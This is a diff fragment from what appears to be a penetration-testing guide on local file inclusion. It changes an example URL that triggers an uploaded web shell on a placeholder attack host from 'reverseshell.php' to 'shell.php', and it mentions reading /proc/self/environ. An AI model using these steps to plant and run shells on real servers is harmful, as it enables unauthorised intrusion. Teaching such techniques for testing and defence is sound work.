@@ -142,7 +142,7 @@ If you're able to request `/proc/self/environ` using LFI, you might be able to g
 ```
 Then execute the shell by calling the URL where it was uploaded:
 ```
-http://[attack host]/folder/reverseshell.php
+http://[attack host]/folder/shell.php
 ```
 
 ## Further reading
